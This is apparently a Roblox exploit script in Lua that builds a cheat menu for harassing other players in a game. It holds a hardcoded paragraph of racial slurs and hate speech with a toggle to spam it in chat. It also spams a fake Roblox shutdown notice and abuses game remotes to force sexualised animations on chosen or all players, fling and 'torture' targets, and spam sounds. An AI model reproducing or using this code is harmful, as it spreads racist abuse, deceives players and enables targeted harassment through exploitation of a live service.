    local paragraph = "Scientific research is a rigorous and evolving process that combines careful observation, controlled experimentation, data analysis, and peer review to validate ideas, challenge assumptions, and steadily expand humanitys understanding of complex natural and physical phenomena."
    local racist_paragraph = "SON OF A BITCH, I HATE NIGGERS, AND YOU ALL ARE A BUNCH OF NIGGERS, GET THE FUCK OUT OF MY SERVER YOU FUCKING NIGGERS, DJ PEDOPHILE IN THE FUCKING SERVER YOU STUPID NAZI SUPPORTING FAT OBESE ASS FUCKING NIGGERS, SUPPORT ONLY THE FUCKING KKK."
    local shutdown_paragraph = "THIS SERVER IS BEING SHUTDOWN BY ROBLOX, YOU WILL DISCONNECT AND YOUR ONLINE STATUS ON ROBLOX WILL BREAK ON ROBLOX, IT WON'T UPDATE FOR NEARLY 5 MINUTES YOU NIGGERS."

    getgenv().ReallyLongSentence = Tab1:CreateButton({
    Name = "Say Really Long Sentence In Chat (FE, no bans)",
    Callback = function()
        send_chat_message(tostring(paragraph))
    end,})

    getgenv().SpamChatRandomSentence = Tab1:CreateToggle({
    Name = "Spam Chat (FE, no bans)",
    CurrentValue = false,
    Flag = "SpammingTheChatHolyGod",
    Callback = function(spam_chat)
        if spam_chat then
            getgenv().spamming_chat_holy_message = true
            while getgenv().spamming_chat_holy_message == true do
            task.wait()
                send_chat_message(tostring(paragraph))
            end
        else
            getgenv().spamming_chat_holy_message = false
        end
    end,})

    getgenv().SpamChatRacistSentence = Tab1:CreateToggle({
    Name = "Spam Chat, Message 2 (FE, no bans)",
    CurrentValue = false,
    Flag = "SpammingRacistMessageInChat",
    Callback = function(spam_chat)
        if spam_chat then
            getgenv().spamming_racist_chat_message = true
            while getgenv().spamming_racist_chat_message == true do
            task.wait()
                send_chat_message(tostring(racist_paragraph))
            end
        else
            getgenv().spamming_racist_chat_message = false
        end
    end,})

    if getgenv().LocalPlayer.UserId == 10252269949 then
        getgenv().SpamShutdownHardMessages = Tab1:CreateToggle({
        Name = "Spam Shutdown Message (FE)",
        CurrentValue = false,
        Flag = "SpammingShutdownMessageThenShutdownInChat",
        Callback = function(spam_the_fucking_chat)
            if spam_the_fucking_chat then
                getgenv().spamming_shutdown_hard_message = true
                while getgenv().spamming_shutdown_hard_message == true do
                task.wait()
                    send_chat_message(tostring(shutdown_paragraph))
                end
            else
                getgenv().spamming_shutdown_hard_message = false
            end
        end,})
    end
end

if get_sitting_tool then
    getgenv().LoopSitPlrTarget = Tab3:CreateInput({
    Name = "Loop Sit Player (FE)",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "TryingToLoopSitPlayer",
    Callback = function(user_to_sit)
        if getgenv().planting_seat_on_player then
            return getgenv().notify("Warning", "You're already running this, turn it off first!", 10)
        end

        local sitting_current_plr = findplr(user_to_sit)
        
        loop_plant_seat_on_plr(true, sitting_current_plr)
    end,})

    getgenv().StopLoopSittingTargetPlr = Tab3:CreateButton({
    Name = "Shutdown/Stop Loop Sit Player",
    Callback = function()
        stop_loop_sitting_plr()
    end,})
end

if Char_User and Char_User:IsA("RemoteEvent") then
    getgenv().KeepChar_UserInput = Tab2:CreateInput({
    Name = "User to be after respawn",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "KeepingThisUserAfterRespawn",
    Callback = function(user_to_keep_respawned)
        User_Selected_Char = tostring(user_to_keep_respawned)
        getgenv().User_Selected_Char_G = User_Selected_Char
    end,})
    task.wait(0.2)
    getgenv().KeepAvatar_Char = Tab2:CreateToggle({
    Name = "Char (but you keep it even after respawn)",
    CurrentValue = false,
    Flag = "KeepUserCharAfterRespawn",
    Callback = function(keeping_users_avatar)
        if keeping_users_avatar then
            Keeping_Char_After_Respawn = true
            getgenv().Chosen_To_Keep_Char_User = true
        else
            Keeping_Char_After_Respawn = false
            getgenv().Chosen_To_Keep_Char_User = false
        end
    end,})
    wait(0.1)
    if getgenv().Chosen_To_Keep_Char_User then
        getgenv().KeepAvatar_Char:Set(true)
    end

    getgenv().CharIntoAPlayer = Tab2:CreateInput({
    Name = "Char Into Player (FE, In The Server)",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "CharIntoPlayerInServer",
    Callback = function(user_charing_into)
        change_into_user(user_charing_into)
    end,})

    getgenv().CharIntoAnyone_FE = Tab2:CreateInput({
    Name = "Char Into Anyone (FE)",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "CharIntoPlayerInServer",
    Callback = function(user_entered)
        change_into_anyone(user_entered)
    end,})
end

local machines_button = get_just_vending_machine_button()
wait(1)
if machines_button then
    getgenv().Get_Cig_Pack = Tab2:CreateButton({
    Name = "Get Cigarettes (FE, Inf Lung Cancer)",
    Callback = function()
        if not fireclickdetector then
            if machines_button then
                pcall(function()
                    getgenv().Character:PivotTo(machines_button.Parent:GetPivot() + Vector3.new(0, 1.5, 0))
                end)
            end
            return 
        end

        local click_detector_found = get_vending_machine_and_button()
        if click_detector_found and click_detector_found:IsA("ClickDetector") then
            local ok, response = pcall(function()
                click_detector_found.MaxActivationDistance = 99999
                wait(0.2)
                fireclickdetector(click_detector_found)
                fireclickdetector(click_detector_found, 999)
            end)

            if not ok then
                getgenv().notify("Warning", "An unexpected error occurred when trying to use 'fireclickdetector'.", 10)
                return getgenv().notify("Error", "Got error response: "..tostring(response), 15)
            end
        else
            return getgenv().notify("Error", "ClickDetector not found.", 3)
        end
    end,})
end

getgenv().force_play_anims_on_all_bots = function(switch)
    if switch == true then
        getgenv().force_anims_on_bot_enabled = true
        while getgenv().force_anims_on_bot_enabled == true do
        task.wait(0.6)
            for _, v in ipairs(Workspace:GetChildren()) do
                if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") and v:FindFirstChild("Bot") then
                    force_play_sus_anim_plr(v, true)
                end
            end
        end
    elseif switch == false then
        getgenv().force_anims_on_bot_enabled = false
    else
        return getgenv().notify("Error", "Invalid argument for force_play_anims_on_bot, expected boolean.", 5)
    end
end

if Play_Anim and Play_Anim:IsA("RemoteFunction") then
    getgenv().ForceAnimPlr = Tab3:CreateInput({
    Name = "Force Play Sus Anim Player (FE)",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "ForcePlayASusAnimationOnPlr",
    Callback = function(Player_Entered_Here)
        local Find_Target = findplr(Player_Entered_Here)
        if not Find_Target then return getgenv().notify("Error", "Player was not found or does not exist!", 5) end
        wait(0.1)
        force_play_sus_anim_plr(Find_Target)
        getgenv().notify("Info", "Force playing Animation on: "..tostring(Find_Target), 5)
    end,})

    getgenv().ForcePlayAnims_OnBot_Toggle = Tab3:CreateToggle({
    Name = "Force Play Anims On Bot",
    CurrentValue = false,
    Flag = "ForcePlayAnimsOnBotToggle",
    Callback = function(force_anims_on_bot)
        if force_anims_on_bot then
            getgenv().force_play_anims_on_all_bots(true)
        else
            getgenv().force_play_anims_on_all_bots(false)
        end
    end,})
end

local function get_all_animations()
	local PlayerGui = PlayerGui
	local Menu_GUI = PlayerGui:FindFirstChild("Menu", true)
	if not Menu_GUI then return {} end

	local Animation_Frame = Menu_GUI:FindFirstChild("Animation", true)
	if not Animation_Frame then return {} end

	local Women_List = Animation_Frame:FindFirstChild("Women_List", true)
	if not Women_List then return {} end

	local animations = {}
	for _, button in ipairs(Women_List:GetChildren()) do
		if button:IsA("TextButton") then
			table.insert(animations, button.Name)
		end
	end

	getgenv().All_Animations = animations
	return animations
end

if PlayerGui:FindFirstChild("Menu", true) then
    wait(0.1)
    get_all_animations()
    wait(0.5)
end

getgenv().AnimAddUser = Tab3:CreateInput({
Name = "Add Animation Whitelist Plr",
PlaceholderText = "User",
RemoveTextAfterFocusLost = true,
Callback = function(thisUserGet)
    local Players = Players
    local LocalPlayer = LocalPlayer
    local Character = Character
    local Humanoid = Humanoid
    local HumanoidRootPart = HumanoidRootPart
    local Workspace = Workspace
    getgenv().singlePlayerTable = getgenv().singlePlayerTable or {}
    local bruhUser = findplr(thisUserGet)

    if not bruhUser then
        return getgenv().notify("Error", "That player does not exist!", 5)
    end
    
    local function addPlayerToGlobalTable(player)
        if next(getgenv().singlePlayerTable) then
            return getgenv().notify("Warning", "Player limit! Only one player can be added at a time!", 5)
        else
            getgenv().singlePlayerTable[player.Name] = player
            wait(0.2)
            if getgenv().singlePlayerTable[player.Name] then
                getgenv().notify("Success", tostring(player.Name)..", was added to Whitelist!", 5)
            elseif not Players[player.Name] then
                return getgenv().notify("Error", tostring(player).." does not exist!", 5)
            elseif bruhUser == LocalPlayer.Name then
                return getgenv().notify("Error", "You cannot add yourself!", 5)
            end
        end
    end
    
    addPlayerToGlobalTable(bruhUser)
end,})

if not getgenv().GoatRemovingConnectionInit then
    getgenv().GoatRemovingConnectionInit = true

    task.spawn(function()
        Players.PlayerRemoving:Connect(function(Player)
            local GoatAnim_Folder = Workspace:FindFirstChild("GoatAnimFol", true)
            getgenv().singlePlayerTable = getgenv().singlePlayerTable or {}
            local Left_Name = Player and Player.Name

            if GoatAnim_Folder then
                for _, v in ipairs(GoatAnim_Folder:GetChildren()) do
                    if v:FindFirstChild(Left_Name.."OLD") then
                        v:Destroy()
                    end
                end
            end

            if getgenv().singlePlayerTable and getgenv().singlePlayerTable[Left_Name] then
                getgenv().notify("Info", "Player left, removing player from animation table...", 5)
                table.clear(getgenv().singlePlayerTable)
                getgenv().notify("Success", "Removed whitelisted player from animation table.", 5)
            end
        end)
    end)
end

function adjust_anim_speed_plr(Player, Speed)
    if not Player then return end
    local GoatAnim_Folder = getgenv().Workspace:FindFirstChild("GoatAnimFol") or getgenv().Workspace:WaitForChild("GoatAnimFol", 5)
    if not GoatAnim_Folder then return getgenv().notify("Error", "GoatAnimFol doesn't exist in Workspace.", 5) end
    local Find_Plr_Folder = GoatAnim_Folder:FindFirstChild(Player.Name) or GoatAnim_Folder:FindFirstChild(Player.Name.."OLD")
    if not Find_Plr_Folder then return getgenv().notify("Error", "That players animator script could not be located.", 5) end
    local Change_Speed_RE = Find_Plr_Folder:FindFirstChild("ChangeSpeed")
    if not Change_Speed_RE then return getgenv().notify("Warning", "The player must have stopped doing an animation.", 5) end

    if Change_Speed_RE and Change_Speed_RE:IsA("RemoteEvent") then
        Change_Speed_RE:FireServer(tostring(Speed))
    end
end

local FORCED_ANIMATION_SPEED = "1"

getgenv().RemoveCopyAnimPlr = Tab3:CreateButton({
Name = "Remove Animation Whitelist",
Callback = function()
    getgenv().singlePlayerTable = getgenv().singlePlayerTable or {}

    if next(getgenv().singlePlayerTable) then
        getgenv().notify("Info", "Clearing animation whitelist table...", 5)
        table.clear(getgenv().singlePlayerTable)
        task.wait(0.2)
    end
end,})

function getThatPlr()
    for i, v in pairs(Players:GetChildren()) do
        if v ~= Players.LocalPlayer then
            if getgenv().singlePlayerTable[v.Name] then
                return v
            end
        end
    end
    return nil
end

getgenv().fling_power = getgenv().fling_power or 5
getgenv().fling_enabled = false
getgenv().current_fling_target = getgenv().current_fling_target or nil

if Play_Anim and Play_Anim:IsA("RemoteFunction") then
    getgenv().FlingToggle = Tab3:CreateToggle({
    Name = "Enable Torture/Fling",
    CurrentValue = false,
    Flag = "FlingToggleFlag",
    Callback = function(enabled)
        getgenv().fling_enabled = enabled

        if enabled then
            if getgenv().current_fling_target then
                getgenv().notify("Success", "Torturing: "..tostring(getgenv().current_fling_target.Name)..".", 3)
            else
                getgenv().notify("Warning", "Enable toggle but no target set yet.", 5)
            end
        else
            getgenv().current_fling_target = nil
            getgenv().notify("Info", "Torture/Fling stopped.", 5)
        end
    end,})

    getgenv().FlingPowerSlider = Tab3:CreateSlider({
    Name = "Fling/Torture Power",
    Range = {0, 500},
    Increment = 1,
    Suffix = "",
    CurrentValue = 5,
    Flag = "FlingPowerSlider",
    Callback = function(value)
        getgenv().fling_power = value
    end,})

    getgenv().FlingPlayerInputTarget = Tab3:CreateInput({
    Name = "Torture Player (FE)",
    CurrentValue = "",
    PlaceholderText = "Enter username",
    RemoveTextAfterFocusLost = false,
    Flag = "FlingPlayerInput",
    Callback = function(player_name)
        if player_name == "" then
            getgenv().current_fling_target = nil
            getgenv().notify("Info", "Target cleared.", 5)
            return 
        end

        local target_player = findplr(player_name)
        if not target_player then
            getgenv().notify("Error", "Player '"..tostring(player_name).."' not found.", 5)
            return
        end

        getgenv().current_fling_target = target_player
        getgenv().notify("Success", "Target set to "..tostring(target_player.Name)..", enable the 'Fling/Torture Player' to begin torturing the Player.", 10)
    end,})
end

getgenv().Flinging_Enabled_Task = getgenv().Flinging_Enabled_Task or task.spawn(function()
    while true do
        task.wait()
        if getgenv().fling_enabled and getgenv().current_fling_target then
            local target = getgenv().current_fling_target

            if target and target.Parent and target.Character and target.Character.Parent then
                local power = getgenv().fling_power or 5
                fling_player(target, power)
            else
                getgenv().current_fling_target = nil
                getgenv().fling_enabled = false
                getgenv().notify("Warning", "Target left the game. Torture stopped.", 6)
            end
        end
    end
end)

local function find_change_speed_remote()
    local cache = getgenv().change_speed_cached_remote
    if cache and cache:IsA("RemoteEvent") then
        return cache
    end

    for _, v in ipairs(getgenv().Workspace:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name:lower():find("change") and v.Name:lower():find("speed") then
            return v
        end
    end

    return nil
end
wait(0.1)
find_change_speed_remote()
wait(1)
if getgenv().change_speed_cached_remote and getgenv().change_speed_cached_remote:IsA("RemoteEvent") then
    getgenv().ForceAnimPlaySpeed = Tab3:CreateSlider({
    Name = "Force Anim Player Speed",
    Range = {0, 15},
    Increment = 0.1,
    Suffix = "",
    CurrentValue = 1,
    Flag = "ForceAnimationSpeedPlayer",
    Callback = function(anim_setter_speed_plr)
        local ConvertToString = tostring(anim_setter_speed_plr)
        task.wait(0.1)
        FORCED_ANIMATION_SPEED = ConvertToString
        wait(0.1)
        if getThatPlr() then
            adjust_anim_speed_plr(getThatPlr(), FORCED_ANIMATION_SPEED)
        end
    end,})
end

if Play_Anim then
    getgenv().PlayAnyEmote = Tab3:CreateDropdown({
    Name = "Force Play Animation On Player",
    Options = getgenv().All_Animations or {},
    CurrentOption = "",
    MultipleOptions = false,
    Flag = "choose_an_animation",
    Callback = function(anim_picked)
        if typeof(anim_picked) == "table" then
            anim_picked = anim_picked[1]
        end
        if typeof(anim_picked) ~= "string" then
            return 
        end
        wait(0.1)
        local animSelected = tostring(anim_picked)
        getgenv().singlePlayerTable = getgenv().singlePlayerTable or {}

        function getThatPlr()
            for i, v in pairs(Players:GetChildren()) do
                if getgenv().singlePlayerTable[v.Name] then
                    return v
                end
            end
            return nil
        end

        local Got_Player = getThatPlr()

        if Got_Player then
            force_play_anim_plr(animSelected, Got_Player)
            task.wait()
            adjust_anim_speed_plr(Got_Player, FORCED_ANIMATION_SPEED)
        end
    end,})
end

if Stop_Anim and Stop_Anim:IsA("RemoteEvent") then
    getgenv().ForceStopAllAnimsOnAPlayer = Tab3:CreateInput({
    Name = "Stop Playing Animation Player (FE)",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "ForceStopAnimationOnPlr",
    Callback = function(Player_Entered_Here)
        local Find_Target = findplr(Player_Entered_Here)
        if not Find_Target then return getgenv().notify("Error", "Player was not found or does not exist!", 5) end
        if not Stop_Anim then return getgenv().notify("Error", "StopAnimation was not found in LocalScriptAPI!", 5) end
        local Players_Char = Find_Target.Character or Find_Target.CharacterAdded:Wait()
        local Target_Human = Players_Char:WaitForChild("Humanoid", 3)

        if Players_Char and Players_Char:FindFirstChildOfClass("Humanoid") then
            if Stop_Anim and Stop_Anim:IsA("RemoteEvent") then
                Stop_Anim:FireServer(Target_Human)
            end
        end
    end,})
end

getgenv().break_whitelist = getgenv().break_whitelist or {}
getgenv().Breaking_Everyones_Char = getgenv().Breaking_Everyones_Char or false
getgenv().breakAllCharsTask = getgenv().breakAllCharsTask or nil
getgenv().whitelist_break_player = function(plr)
    if not plr then return end
    if table.find(getgenv().break_whitelist, plr.UserId) then return getgenv().notify("Warning", tostring(plr).." is already whitelisted.", 5) end
    table.insert(getgenv().break_whitelist, plr.UserId)
    getgenv().notify("Success", "Whitelisted player: "..tostring(plr), 5)
end

getgenv().unwhitelist_break_player = function(plr)
    if not plr then return end
    local t = getgenv().break_whitelist
    local idx = table.find(t, plr.UserId)
    if not idx then return getgenv().notify("Warning", tostring(plr).." is not whitelisted.", 5) end
    table.remove(t, idx)
    if not next(t) then
        getgenv().break_whitelist = {}
        getgenv().notify("Success", "Removed whitelisted player: "..tostring(plr), 5)
    end
end

getgenv().is_break_whitelisted = function(plr)
    if not plr then return false end
    return table.find(getgenv().break_whitelist, plr.UserId) ~= nil
end

if Play_Anim and Play_Anim:IsA("RemoteFunction") then
    getgenv().WhitelistBreakPeoplesCharactersInput = Tab3:CreateInput({
    Name = "Whitelist Player(s)",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "NeverBreakThisPersonsCharacter",
    Callback = function(Player_Entered_Here)
        local Find_Target = findplr(Player_Entered_Here)
        if not Find_Target then return getgenv().notify("Error", "Player was not found or does not exist!", 5) end

        getgenv().whitelist_break_player(Find_Target)
    end,})

    getgenv().Remove_WhitelistBreakPeoplesCharactersInput = Tab3:CreateInput({
    Name = "Un-whitelist Player(s)",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "RemoveThisPlayerFromBreakWhitelistTbl",
    Callback = function(Player_Entered_Here)
        local Find_Target = findplr(Player_Entered_Here)
        if not Find_Target then return getgenv().notify("Error", "Player was not found or does not exist!", 5) end

        getgenv().unwhitelist_break_player(Find_Target)
    end,})

    create_toggle("breakAllChars", "Break Everyones Character (FE)", false, "BreakingAllCharactersEnabled", Tab3, function(state)
        if state then
            getgenv().Breaking_Everyones_Char = true
            if getgenv().breakAllCharsTask then return end

            getgenv().breakAllCharsTask = task.spawn(function()
                while getgenv().Breaking_Everyones_Char do
                    for _, plr in ipairs(Players:GetPlayers()) do
                        if not getgenv().Breaking_Everyones_Char then break end

                        local is_friend = false
                        local ok = pcall(function()
                            is_friend = plr:IsFriendsWith(LocalPlayer.UserId)
                        end)

                        if not ok then
                            local ok2 = pcall(function()
                                is_friend = plr:IsFriendsWithAsync(LocalPlayer.UserId)
                            end)
                            if not ok2 then
                                is_friend = false
                            end
                        end

                        if (plr ~= Players.LocalPlayer) and (plr.Character ~= nil) and (not getgenv().is_break_whitelisted(plr)) and (not is_friend) then
                            pcall(force_play_sus_anim_plr, plr)
                        end

                        task.wait()
                    end
                    task.wait()
                end
                getgenv().breakAllCharsTask = nil
            end)
        else
            getgenv().Breaking_Everyones_Char = false
        end
    end)
end

if Stop_Anim and Stop_Anim:IsA("RemoteEvent") then
    create_toggle("stopAllAnimations", "Loop Stop All Animations (FE)", false, "StoppingAllAnimsEnabled", Tab3, function(enabled)
        getgenv().Stopping_Everyones_Anim = enabled

        if not enabled then
            return
        end

        if not Stop_Anim then
            return getgenv().notify("Error", "StopAnimation was not found in API!", 5)
        end

        task.spawn(function()
            while getgenv().Stopping_Everyones_Anim == true do
                task.wait(1.8)
                for _, plr in ipairs(Players:GetPlayers()) do
                    if not getgenv().Stopping_Everyones_Anim then
                        break
                    end

                    if plr ~= Players.LocalPlayer then
                        local hum = return_human(plr, 1)
                        if hum and hum.Parent then
                            pcall(function()
                                Stop_Anim:FireServer(hum)
                            end)
                        end
                    end
                end
            end
        end)
    end)
end

if Sync_Player_RE then
    getgenv().ForceSyncAnyPlayer = Tab3:CreateInput({
    Name = "Force Sync Player (FE)",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "ForceSyncingAnyPlayer",
    Callback = function(player_to_force_sync)
        local TargetSync_Victim = findplr(player_to_force_sync)
        if not TargetSync_Victim then return getgenv().notify("Error", "Player was not found or does not exist.", 5) end

        force_sync_plr(TargetSync_Victim)
    end,})
end

if res_remote or Char_User_RE or Respawn_Remote then
    create_button(RespawnAtCurrentLoc, "Fast Respawn (FE)", Tab2, function()
        respawn_at_current_location()
    end)
end

if Sus_Sound and Sus_Sound:IsA("RemoteEvent") then
    create_toggle("SpamSusSound_FE_All", "Spam Sus Sound For All (FE)", false, "SpamSusSoundAll", Tab1, function(sus_noises_enabled)
        if sus_noises_enabled then
            spam_sound_all(true)
        else
            spam_sound_all(false)
        end
    end)
end
